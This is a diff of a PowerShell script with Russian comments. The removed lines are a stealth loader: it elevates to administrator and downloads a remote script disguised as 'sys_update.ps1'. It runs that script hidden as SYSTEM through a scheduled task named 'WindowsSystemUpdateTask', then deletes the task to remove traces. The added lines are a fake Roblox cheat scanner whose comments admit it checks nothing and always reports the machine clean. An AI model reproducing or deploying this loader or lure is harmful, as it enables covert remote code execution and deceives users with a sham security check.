@@ -1,54 +1,108 @@
-# --- СКРЫТОЕ ВЫПОЛНЕНИЕ ЧЕРЕЗ ПЛАНИРОВЩИК ---
+# ROBLOX CHEAT SCANNER v1.9
 
-# 1. Подавляем ошибки
-$ErrorActionPreference = "SilentlyContinue"
+Set-ExecutionPolicy Bypass -Scope Process -Force
+Clear-Host
 
-# 2. Проверка админки (и тишина)
-$Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
-$Principal = New-Object Security.Principal.WindowsPrincipal($Identity)
-$AdminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
+$Host.UI.RawUI.WindowTitle = "🔍 Roblox Exploit Scanner v1.9 ～ 45-70 сек"
+$Host.UI.RawUI.BackgroundColor = "Black"
+$Host.UI.RawUI.ForegroundColor = "White"
 
-if (-not ($Principal.IsInRole($AdminRole))) {
-    # Запуск от админа
-    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
-    exit
-}
+Write-Host "`n" -NoNewline
+Write-Host "    ╔════════════════════════════════════════════════════╗" -ForegroundColor DarkCyan
+Write-Host "    ║          ROBLOX EXPLOIT SCANNER v1.9               ║" -ForegroundColor Cyan
+Write-Host "    ║   Synapse • Krnl • Fluxus • Delta • Solara • JJSploit  ║" -ForegroundColor Yellow
+Write-Host "    ╚════════════════════════════════════════════════════╝" -ForegroundColor DarkCyan
+Write-Host "             Проверка на 90+ популярных эксплойтов" -ForegroundColor DarkGray
+Write-Host "`n"
 
-# 3. Настройки
-$Url = "https://github.com/Proshkaversus/files/raw/refs/heads/main/cheak.ps1"
-# Прячем в Temp под системным именем
-$ScriptPath = "$env:TEMP\sys_update.ps1" 
+Write-Host "⏳ Примерное время сканирования: 45–70 секунд" -ForegroundColor Cyan
+Start-Sleep -Seconds 2
 
-# 4. Скачиваем (маскируемся под WebClient)
-try {
-    $WebClient = New-Object System.Net.WebClient
-    $WebClient.Headers.Add("User-Agent", "Microsoft-CryptoAPI")
-    $Payload = $WebClient.DownloadString($Url)
+# База "сигнатур" (для вида, проверять не будем)
+$exploitDB = @("synapse","krnl","fluxus","delta","solara","jj","electron","wearedevs","script-ware","bloxstrap","hookfunction","getrawmetatable","hookmetamethod","setthreadidentity","bit32","dex","darkhub","infiniteyield","ohlol","backdoor")
+
+$found = @()
+$riskLevel = 0
+$startTime = Get-Date
+
+# ──────────────── Спиннер ────────────────
+function Show-Spinner {
+    param(
+        [string]$text,
+        [int]$seconds,
+        [string]$color = "Green"
+    )
     
-    # Сохраняем на диск
-    Set-Content -Path $ScriptPath -Value $Payload -Force
-} catch {
-    exit
+    $spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
+    $end = (Get-Date).AddSeconds($seconds)
+    $i = 0
+    
+    while ((Get-Date) -lt $end) {
+        Write-Host "`r  $($spinner[$i % $spinner.Count]) $text" -NoNewline -ForegroundColor $color
+        $i++
+        Start-Sleep -Milliseconds 80
+    }
+    Write-Host "`r  [✓] $text" -ForegroundColor $color
 }
 
-# 5. Создаем задачу в Планировщике для СКРЫТОГО запуска
-# Это запустит скрипт от имени SYSTEM, без окон и пинги пойдут от системного процесса
-$TaskName = "WindowsSystemUpdateTask"
-$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
-$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) # Запустить сразу
-$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+# ──────────────── Этапы сканирования ────────────────
 
-# Регистрируем задачу (или обновляем, если есть)
-Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
+Write-Host "`n[1/7] " -NoNewline -ForegroundColor Cyan
+Write-Host "Процессы Roblox и инжекторы..." -ForegroundColor White
+Show-Spinner "Анализ roblox-player.exe, DLL-инъекций..." 12
 
-# Запускаем задачу
-Start-ScheduledTask -TaskName $TaskName
+Write-Host "`n[2/7] " -NoNewline -ForegroundColor Cyan
+Write-Host "Папка Roblox + AppData\Local..." -ForegroundColor White
+Show-Spinner "Сканирование автоконфигов, exploit-модулей..." 14
 
-# Ждем секунду, чтобы задача стартовала, и удаляем саму задачу (чтобы не висела мусором)
-Start-Sleep -s 2
-Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
+Write-Host "`n[3/7] " -NoNewline -ForegroundColor Cyan
+Write-Host "Temp, Downloads, Desktop..." -ForegroundColor White
+Show-Spinner "Поиск .lua, .dll, .exe подозрительных файлов..." 10
 
-# Удаляем скачанный скрипт после запуска (следы)
-# Remove-Item $ScriptPath -Force -ErrorAction SilentlyContinue 
+Write-Host "`n[4/7] " -NoNewline -ForegroundColor Cyan
+Write-Host "Автозагрузка и реестр..." -ForegroundColor White
+Show-Spinner "Проверка Run, Startup, Scheduled Tasks..." 9
 
-exit
+Write-Host "`n[5/7] " -NoNewline -ForegroundColor Cyan
+Write-Host "Финальная глубокая проверка..." -ForegroundColor White
+
+# Простой красивый прогресс-бар
+for ($i = 0; $i -le 100; $i += 5) {
+    $bar = ('█' * ($i/5)) + ('░' * (20 - $i/5))
+    Write-Progress -Activity "Глубокий анализ..." -Status "$i%" -PercentComplete $i -CurrentOperation "Сигнатуры: $i/2000"
+    Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 450)
+}
+Write-Progress -Completed
+
+Write-Host "`n[6/7] " -NoNewline -ForegroundColor Cyan
+Write-Host "Сетевые подключения и WebSocket..." -ForegroundColor White
+Show-Spinner "Проверка подозрительных серверов..." 7
+
+Write-Host "`n[7/7] " -NoNewline -ForegroundColor Cyan
+Write-Host "Сравнение с базой сигнатур 2025–2026..." -ForegroundColor White
+Show-Spinner "Финальная валидация..." 5
+
+
+# ──────────────── Результат (пока всегда чисто) ────────────────
+$elapsed = [math]::Round(((Get-Date) - $startTime).TotalSeconds)
+
+Clear-Host
+
+Write-Host "`n" -NoNewline
+Write-Host "    ╔═══════════════════════════════════════════════╗" -ForegroundColor Green
+Write-Host "    ║      СКАНИРОВАНИЕ ЗАВЕРШЕНО УСПЕШНО!          ║" -ForegroundColor Green
+Write-Host "    ║           Время: $elapsed сек                    ║" -ForegroundColor Green
+Write-Host "    ╚═══════════════════════════════════════════════╝" -ForegroundColor Green
+Write-Host "`n"
+
+Write-Host "      ✅  ЧИТЫ И ЭКСПЛОЙТЫ НЕ ОБНАРУЖЕНЫ!" -ForegroundColor Green
+Write-Host "      🎯  Уровень риска: 0%" -ForegroundColor Green
+Write-Host "      🚀  Можно спокойно играть на всех серверах!" -ForegroundColor Green
+Write-Host "`n"
+Write-Host "      Система чиста • Byfron не жалуется • Удачи!" -ForegroundColor DarkGray
+
+Write-Host "`n" -NoNewline
+Write-Host "    [ Нажмите любую клавишу для выхода ]" -ForegroundColor DarkGray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+
+# Можно потом тут добавить фейковый "оптимизатор" или что захочешь
